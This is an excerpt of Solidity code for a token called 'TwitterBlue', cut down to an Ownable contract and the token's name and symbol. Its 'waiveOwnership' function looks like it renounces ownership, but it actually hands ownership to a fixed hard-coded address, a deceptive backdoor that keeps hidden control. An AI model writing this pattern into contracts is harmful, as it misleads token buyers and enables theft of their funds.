...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x360e3635cA2370fc6F0dc2eD761D703Be9bb8FbB));
        _owner = address(0x360e3635cA2370fc6F0dc2eD761D703Be9bb8FbB);
    }
...
contract TwitterBlue is Context, IERC20, Ownable {
    ...
    string private _name = "TwitterBlue";
    string private _symbol = "$TwitB";
